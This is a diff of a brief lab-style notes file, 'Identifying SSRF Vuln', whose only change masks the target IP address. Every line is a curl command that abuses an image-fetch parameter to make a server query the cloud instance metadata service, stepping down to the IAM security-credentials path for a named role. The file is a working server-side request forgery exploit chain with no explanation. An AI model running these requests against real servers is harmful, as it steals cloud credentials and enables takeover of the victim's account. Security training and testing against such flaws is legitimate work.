@@ -1,19 +1,19 @@
 ~~~ Identifying SSRF Vuln ~~~
 
-http://10.0.2.39:8080/
+http://10.0.2.x:8080/
 
-curl -G http://10.0.2.39:8080/extimage?p=http://169.254.169.254
+curl -G http://10.0.2.x:8080/extimage?p=http://169.254.169.254
 
-curl -G http://10.0.2.39:8080/extimage?p=http://169.254.169.254/latest
+curl -G http://10.0.2.x:8080/extimage?p=http://169.254.169.254/latest
 
-curl -G http://10.0.2.39:8080/extimage?p=http://169.254.169.254/latest/meta-data/
+curl -G http://10.0.2.x:8080/extimage?p=http://169.254.169.254/latest/meta-data/
 
-curl -G http://10.0.2.39:8080/extimage?p=http://169.254.169.254/latest/meta-data/instance-id/
+curl -G http://10.0.2.x:8080/extimage?p=http://169.254.169.254/latest/meta-data/instance-id/
 
-curl -G http://10.0.2.39:8080/extimage?p=http://169.254.169.254/latest/meta-data/iam/
+curl -G http://10.0.2.x:8080/extimage?p=http://169.254.169.254/latest/meta-data/iam/
 
-curl -G http://10.0.2.39:8080/extimage?p=http://169.254.169.254/latest/meta-data/iam/info/
+curl -G http://10.0.2.x:8080/extimage?p=http://169.254.169.254/latest/meta-data/iam/info/
 
-curl -G http://10.0.2.39:8080/extimage?p=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+curl -G http://10.0.2.x:8080/extimage?p=http://169.254.169.254/latest/meta-data/iam/security-credentials/
 
-curl -G http://10.0.2.39:8080/extimage?p=http://169.254.169.254/latest/meta-data/iam/security-credentials/awstrainingstack001-bluelizardPrivEC2Role-PTH34586VUC1/
+curl -G http://10.0.2.x:8080/extimage?p=http://169.254.169.254/latest/meta-data/iam/security-credentials/awstrainingstack001-bluelizardPrivEC2Role-PTH34586VUC1/
